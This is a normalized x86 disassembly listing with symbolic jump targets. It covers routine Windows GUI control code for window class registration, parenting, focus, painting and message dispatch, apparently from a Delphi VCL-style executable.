test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_43aeec
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_43aeec
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
call sub_403a1c
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40c8a0
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40c8a0
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408780
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_444c78
push 0x1
mov eax [ esi + 0x68 ]
call sub_41c73c
mov ecx eax
mov edx 0x30
mov eax esi
call sub_43f334
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_444968
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441ae8
lea eax [ ebp - 0xc0 ]
call sub_403fe0
retn
mov eax esi
mov si 0xffee
call sub_40348c
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_441af0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406a40
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_441b30
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4178bc
mov eax esi
call sub_41780c
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41780c
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_4178c4
pop esi
pop ebx
retn
sub_441b68
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_419108
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_419094
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_419094
mov eax esi
call sub_419110
add esp 0x10
pop esi
pop ebx
retn
sub_441bd0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_441bbc
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_413a74
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413a74
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_441ca8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43f66c
mov eax [ ebp - 0x8 ]
push eax
push sub_441b30
mov eax [ ebp - 0x8 ]
push eax
push sub_441b68
push ebp
call sub_441bd0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441d04
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43e0c0
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408734
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408748
mov ecx eax
mov edx edi
mov eax ebx
call sub_43e0d0
mov eax r-xdata
call sub_408754
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_43cb74
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_441d5c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_441da9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441db0
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40c8a0
sub_441dc0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_413ad0
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_413a74
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_441e08
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_441698
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_441dc0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44165c
call sub_43d7a0
inc edi
dec esi
jne r-xdata
sub_441ea4
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_441ec0
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_413a74
call sub_441ec0
inc edi
dec esi
jne r-xdata
sub_441f20
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_40348c
mov ebx eax
mov eax edi
call sub_441ec0
mov eax edi
call sub_44205c
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_441f60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_442036
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_43f334
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413a74
call sub_441f60
inc esi
dec ebx
jne r-xdata
sub_44205c
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_441f60
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_44209c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_441ec0
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_44205c
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406a28
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43f334
jmp r-xdata
sub_442124
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44217c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_44216b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442172
call sub_43cb74
call sub_4208c8
retn
sub_44219c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_412618
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406a10
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_43f334
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_442254
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_413a74
call sub_44219c
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_413a74
call sub_44219c
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4422e8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_444968
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_4069fc
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_442254
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406a10
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_43f334
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_44237c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_43e8f0
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_43f400
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4422e8
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_4069fc
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_43dc90
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_442254
test eax eax
je r-xdata
mov eax ebx
call sub_4553f0
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_43f400
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_444c6c
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_444968
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_444968
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_43f334
sub_4424e0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_43f594
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_43f334
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41c268
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_41cf0c
call sub_41c268
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_41cf48
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43dcec
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_4425e8
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_43afd8
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_43f334
mov [ esi + 0xc ] eax
mov bl 0x1
sub_44261c
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_44273c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442774
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442743
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_413a74
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_442774
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_413ad0
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_413a74
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412640
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_413a74
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_41c268
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_412640
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_41c268
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412640
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_43ca88
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_43f334
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_4429a4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_43ca88
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_444968
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_444968
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_43f334
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_43f334
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_43ca88
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_4429a4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_413a74
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_442af8
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
